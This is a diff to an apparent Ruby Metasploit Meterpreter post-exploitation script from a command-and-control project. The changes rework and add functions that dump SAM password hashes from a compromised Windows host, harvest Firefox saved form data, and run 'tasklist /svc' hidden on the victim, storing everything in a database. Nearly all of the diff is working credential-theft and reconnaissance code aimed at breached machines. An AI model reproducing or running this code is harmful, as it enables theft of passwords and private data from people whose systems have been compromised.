@@ -112,20 +112,23 @@ def write_db host
 end
 
 #todo "run enum_firefox"
-def save_frfx_forms hostID, newRun = false, clear = false
-  
+def get_frfx_forms hostID, newRun = false, clear = true
   if newRun 
-    client.run_cmd("run enum_firefox") #works only local
+    @client.run_cmd("enum_firefox") #works only local
   end
-  props =   YAML.load_file( '/home/nox/dev/fidius2/candc/config/msf.yml' )
+  props =   YAML.load_file( 'config/msf.yml' )
   frfxLogPath = "/home/" + props['def_user'] + "/.msf3/logs/scripts/enum_firefox/"
   arr = Array.new
-  Dir.foreach(frfxLogPath) { |x| 
+  Dir.foreach(frfxLogPath) { |x|
     arr << x
   }
   if arr.size == 0
     puts "save_frfx_forms abborted, coz no frfx-log-dir was found."
     return;
+  end
+  
+  if clear
+    FrfxForm.delete_all
   end
  
   frfxLogDir =  frfxLogPath + arr.sort.last 
@@ -136,27 +139,69 @@ def save_frfx_forms hostID, newRun = false, clear = false
       FrfxForm.new(:host_id=>hostID,:form_name=>lineArray[1],:value=>lineArray[3]).save # insert into ...
     end
   end
-  if clear 
-    system 'rm -r ' + frfxLogDir
-  end
+  #if clear 
+    #system 'rm -r ' + frfxLogDir
+  #end
 end  
 
 #Function for running the hashdump
-
-def get_hashdump_information
-  #print_status("Dumping password hashes...")
-	begin
-		@client.core.use("priv")
-		hashes = @client.priv.sam_hashes
-		hashes.each do |h|
-		  HashDump.new(:host_id=>$pivot[:id],:hash_key=>h.to_s()).save
-		end
-		#print_status("Hashes Dumped")
-	rescue ::Exception => e
-		print_status("\tError dumping hashes: #{e.class} #{e}")
-		print_status("\tPayload may be running with insuficient privileges!")
-	end
+def get_hashdump_information clear = true
+  begin
+    if clear
+      HashDump.delete_all
+    end
+    @client.core.use("priv")
+	hashes = @client.priv.sam_hashes
+	hashes.each do |h|
+      HashDump.new(:host_id=>$pivot[:id],:hash_key=>h.to_s()).save
+    end
+  rescue ::Exception => e
+	puts("\tError dumping hashes: #{e.class} #{e}")
+	puts("\tPayload may be running with insufficient privileges!")
+  end
 end
+
+#proccesses result of 'tasklist /svc' and saves it in the db
+def get_tasklist hostID, clear = true
+  #to not overcrowd the database
+  if clear                     
+    HostTasklist.delete_all
+    HostTaskService.delete_all
+  end
+  r, cmdout = '', '' 
+  r = @client.sys.process.execute('tasklist /svc', nil, {'Hidden' => true, 'Channelized' => true})
+  
+  while d = r.channel.read #process d immediately doesn't work for some reason (maybe threads?)
+    cmdout << d
+  end
+  
+  lines = cmdout.split("\n")
+  i = 4
+  actPid = -1
+  while i < lines.size - 1
+    i += 1
+    lineArray = lines[i].split
+    #lineArray.size > 2 and
+    if lineArray[1].to_i != 0
+      actPid = lineArray[1]
+      HostTasklist.new(:host_id=>hostID,:name=>lineArray[0],:pid=>actPid).save
+      y = 2
+      while y < lineArray.size 
+        service = ''
+        if lineArray[y].start_with? "Nicht" #TODO...just works in the german-windows-versions
+          break
+        end
+        HostTaskService.new(:host_id=>hostID,:pid=>actPid,:service=>lineArray[y].gsub(/,/,"")).save
+        y += 1
+      end
+    else
+      services = lines[i].split
+      services.each do |service|
+        HostTaskService.new(:host_id=>hostID,:pid=>actPid,:service=>service.gsub(/,/,"")).save
+      end
+    end
+  end
+end 
 
 # Has to be the first Function cause $Pivot is set
 get_arp_a_infos
@@ -165,5 +210,8 @@ get_host_infos
 
 get_hashdump_information
 
+get_frfx_forms $pivot[:id]
 
-#save_frfx_forms $pivot[:id]
+get_tasklist $pivot[:id]
+
+
